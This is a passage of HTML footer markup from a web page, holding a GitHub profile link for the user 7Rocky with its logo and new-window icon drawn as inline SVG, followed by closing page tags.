href="https://github.com/7Rocky" target="_blank" class="link-transition github link dib z-999 pt3 pt0-l mr1" title="GitHub link" rel="noopener" aria-label="follow on GitHub——Opens in a new window"><svg height="30" style="enable-background:new 0 0 512 512" viewBox="0 0 512 512" width="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M256 32C132.3 32 32 134.8 32 261.7c0 101.5 64.2 187.5 153.2 217.9 11.2 2.1 15.3-5 15.3-11.1.0-5.5-.2-19.9-.3-39.1-62.3 13.9-75.5-30.8-75.5-30.8-10.2-26.5-24.9-33.6-24.9-33.6-20.3-14.3 1.5-14 1.5-14 22.5 1.6 34.3 23.7 34.3 23.7 20 35.1 52.4 25 65.2 19.1 2-14.8 7.8-25 14.2-30.7-49.7-5.8-102-25.5-102-113.5.0-25.1 8.7-45.6 23-61.6-2.3-5.8-10-29.2 2.2-60.8.0.0 18.8-6.2 61.6 23.5 17.9-5.1 37-7.6 56.1-7.7 19 .1 38.2 2.6 56.1 7.7 42.8-29.7 61.5-23.5 61.5-23.5 12.2 31.6 4.5 55 2.2 60.8 14.3 16.1 23 36.6 23 61.6.0 88.2-52.4 107.6-102.3 113.3 8 7.1 15.2 21.1 15.2 42.5.0 30.7-.3 55.5-.3 63 0 6.1 4 13.3 15.4 11C415.9 449.1 480 363.1 480 261.7 480 134.8 379.7 32 256 32z"/></svg><span class="new-window"><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></span></a></div></div></div></div></div></footer></body></html>